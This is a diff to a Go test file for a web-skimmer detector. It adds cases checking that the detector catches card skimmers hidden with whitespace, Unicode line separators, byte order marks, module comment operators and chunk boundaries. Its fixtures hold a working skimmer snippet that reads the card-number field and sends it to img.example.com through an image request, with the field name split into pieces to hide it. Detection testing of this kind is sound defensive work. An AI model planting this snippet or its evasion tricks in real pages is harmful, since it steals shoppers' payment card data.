@@ -263,8 +263,8 @@ func TestSkimmerAcrossCommentsAndLongLiterals(t *testing.T) {
 		"html open comment":       "var a=1;\n<!--/*\n" + skim + "\n//*/\n",
 		"html close comment":      "var a=1;\n-->/*\n" + skim + "\n//*/\n",
 		"hashbang":                "#!/*\n" + skim + "\n//*/\n",
-		"line separator":          "var a=1;//x " + skim + " var b=2;",
-		"paragraph separator":     "var a=1;//x " + skim + " var b=2;",
+		"line separator":          "var a=1;//x\u2028" + skim + "\u2028var b=2;",
+		"paragraph separator":     "var a=1;//x\u2029" + skim + "\u2029var b=2;",
 		"carriage return":         "var a=1;//x\r" + skim + "\rvar b=2;",
 		"long string":             "var t='" + x + "/*';" + skim + "var e='*/';",
 		"long template":           "var t=`" + x + "/*`;" + skim + "var e='*/';",
@@ -273,5 +273,36 @@ func TestSkimmerAcrossCommentsAndLongLiterals(t *testing.T) {
 		if skimmerSignals([]byte(src)) == nil {
 			t.Errorf("%s: not found", name)
 		}
+	}
+}
+
+// Every white space and line terminator of JavaScript reads as the tokenizer's own, a line
+// continuation inside a literal joins it, a module's operators that look like comments are read
+// both ways, and a piece that starts a line knows it.
+func TestSkimmerAcrossWhiteSpaceAndModules(t *testing.T) {
+	use := `;var f=document.querySelector('[name="'+s+'"]');new Image().src="https://img.example.com/p?d="+f.value;`
+	skim := `var s='payment[c'+'c_n'+'umber]'` + use
+	for name, src := range map[string]string{
+		"no-break space":           "var\u00a0s='payment[c';var f=document.querySelector('[name=\"'+s+'c_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value;",
+		"ideographic space":        "var\u3000s='payment[c';var f=document.querySelector('[name=\"'+s+'c_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value;",
+		"vertical tab":             "var\vs='payment[c';var f=document.querySelector('[name=\"'+s+'c_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value;",
+		"line separator in a name": "var s='payment[c\\\u2028c_number]'" + use,
+		"long string and CRLF":     "var t='" + strings.Repeat("x", maxLiteral+100) + "\\\r\ndef';var z='/*';" + skim + "\nvar w='*/';",
+		"byte order mark":          "\ufeff#!/*\n" + skim + "\n//*/\n",
+		"module comparison":        "var a=0,b=1;a<!--b;" + skim,
+		"module decrement":         "var x=1\n-->0;" + skim,
+	} {
+		if skimmerSignals([]byte(src)) == nil {
+			t.Errorf("%s: not found", name)
+		}
+	}
+	// "-->" first in a piece is a comment when the piece before ended its line.
+	src := []byte(strings.Repeat(" ", skimmerChunk-1) + "\n-->/*\n" + strings.Repeat("var a=1;", skimmerOverlap/8+64) + skim + "\n//*/\n")
+	var fam skimmerFamilies
+	for off := 0; off < len(src); off += skimmerChunk {
+		fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
+	}
+	if fam.verdict() == nil {
+		t.Error("a line start across pieces: not found")
 	}
 }
